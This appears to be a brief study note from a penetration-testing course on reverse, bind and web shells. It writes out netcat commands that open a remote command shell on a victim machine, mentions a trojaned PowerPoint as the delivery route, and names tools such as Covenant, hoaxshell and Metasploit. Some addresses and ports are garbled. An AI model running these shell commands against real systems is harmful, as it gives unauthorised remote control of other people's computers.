# Shells


**Reverse Shell**
attacker  <-  victim

Example: 
1. on Attacker:  `nc -l -v -p 443`   start listener (will listen on 192.168.75.133.433)
2. victim: opens application with trojaner (example powerpoint) and opens reverse shell 
  - would call: `nc.exe -e cmd.exe 192.168.75.133.433` to 
3. on attacker: shell is on vicims pc. Can for example explore filesystem

Reverse shell is more common (because client connections are usually allowed)

**Bind shell**
attacker  ->  victim

Example
1. On victim `nc.exe -l -v 443 cmd.exe`  -> listener on 192.168.75.144 port 443  
2. Attacker: `nc -v 192.168.75.144 -443` -> is now on vicitms pc


**Web shell**
attacker -> vicitm (RAT)

RAT= Remote adminstration toolkit

- Downloadable tools
  - Covenant
  - hoaxshell
  - msfconsole
    - tool to create malware

**Varia**
NC: `nc -h`
Sockat: `socat`  -> similar to nc but more capabilities (great tool)
metasploit

